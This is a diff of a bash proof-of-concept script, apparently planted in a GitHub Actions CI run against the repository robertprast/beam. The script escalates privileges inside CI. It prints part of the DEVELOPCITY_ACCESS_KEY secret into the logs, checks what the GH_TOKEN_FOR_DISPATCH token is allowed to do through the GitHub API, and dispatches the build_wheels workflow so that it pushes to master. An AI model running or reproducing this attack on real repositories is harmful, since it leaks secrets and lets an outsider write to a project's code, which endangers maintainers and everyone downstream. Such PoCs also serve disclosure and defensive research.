@@ -1,56 +1,43 @@
 #!/bin/bash
 echo "========================================="
-echo "  CRITICAL: Privilege Escalation PoC"
-echo "  Attacker: treborlab"
-echo "  Target: robertprast/beam"
+echo "  CRITICAL: Privilege Escalation PoC v2"
+echo "  Attacker: treborlab → robertprast/beam"
 echo "  Time: $(date -u)"
 echo "========================================="
+
 echo ""
-echo "=== Step 1: Code Execution Confirmed ==="
-echo "Running on: $(uname -a)"
-echo "User: $(whoami)"
+echo "=== Secrets ==="
+echo "DEVELOCITY_ACCESS_KEY: ${DEVELOCITY_ACCESS_KEY:0:15}..."
+echo "GH_TOKEN_FOR_DISPATCH length: ${#GH_TOKEN_FOR_DISPATCH}"
+
 echo ""
-echo "=== Step 2: Secrets Available ==="
-echo "DEVELOCITY_ACCESS_KEY length: ${#DEVELOCITY_ACCESS_KEY}"
-echo "GITHUB_TOKEN length: ${#GITHUB_TOKEN}"
+echo "=== Token Permissions ==="
+curl -s -H "Authorization: token $GH_TOKEN_FOR_DISPATCH" \
+  https://api.github.com/repos/$GITHUB_REPOSITORY \
+  | jq '{full_name, permissions}' 2>/dev/null
+
 echo ""
-echo "=== Step 3: GITHUB_TOKEN Permissions ==="
-# Check what permissions the token has
-curl -s -H "Authorization: token $GITHUB_TOKEN" \
-  -H "Accept: application/vnd.github.v3+json" \
-  https://api.github.com/repos/$GITHUB_REPOSITORY | jq '{permissions}' 2>/dev/null || echo "Could not check permissions"
-echo ""
-echo "=== Step 4: Dispatching build_wheels.yml via actions:write ==="
-# Get the workflow ID for build_wheels.yml
-BUILD_WF_ID=$(curl -s -H "Authorization: token $GITHUB_TOKEN" \
-  -H "Accept: application/vnd.github.v3+json" \
+echo "=== Dispatching build_wheels.yml ==="
+BUILD_WF_ID=$(curl -s -H "Authorization: token $GH_TOKEN_FOR_DISPATCH" \
   "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/workflows" | \
   jq '.workflows[] | select(.name == "Build python wheels") | .id')
 
-echo "build_wheels workflow ID: $BUILD_WF_ID"
+echo "Workflow ID: $BUILD_WF_ID"
 
 if [ -n "$BUILD_WF_ID" ] && [ "$BUILD_WF_ID" != "null" ]; then
-  # Dispatch the workflow - this runs with contents:write!
-  DISPATCH_RESULT=$(curl -s -w "\n%{http_code}" \
+  HTTP=$(curl -s -o /dev/null -w "%{http_code}" \
     -X POST \
-    -H "Authorization: token $GITHUB_TOKEN" \
-    -H "Accept: application/vnd.github.v3+json" \
+    -H "Authorization: token $GH_TOKEN_FOR_DISPATCH" \
     "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/workflows/$BUILD_WF_ID/dispatches" \
     -d '{"ref":"master"}')
-  
-  HTTP_CODE=$(echo "$DISPATCH_RESULT" | tail -1)
-  echo "Dispatch HTTP status: $HTTP_CODE"
-  
-  if [ "$HTTP_CODE" = "204" ]; then
+  echo "Dispatch status: $HTTP"
+  if [ "$HTTP" = "204" ]; then
     echo "=== ESCALATION SUCCESSFUL ==="
-    echo "build_wheels.yml dispatched with contents:write"
-    echo "It will push 'hi from trebor' to README.md on master"
-  else
-    echo "Dispatch response: $(echo "$DISPATCH_RESULT" | head -1)"
+    echo "build_wheels.yml dispatched → will push to master"
   fi
 else
-  echo "Could not find build_wheels workflow"
+  echo "Workflow not found, listing available:"
+  curl -s -H "Authorization: token $GH_TOKEN_FOR_DISPATCH" \
+    "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/workflows" | \
+    jq '.workflows[] | {id, name, state}' 2>/dev/null | head -20
 fi
-
-echo ""
-echo "=== PoC Complete ==="
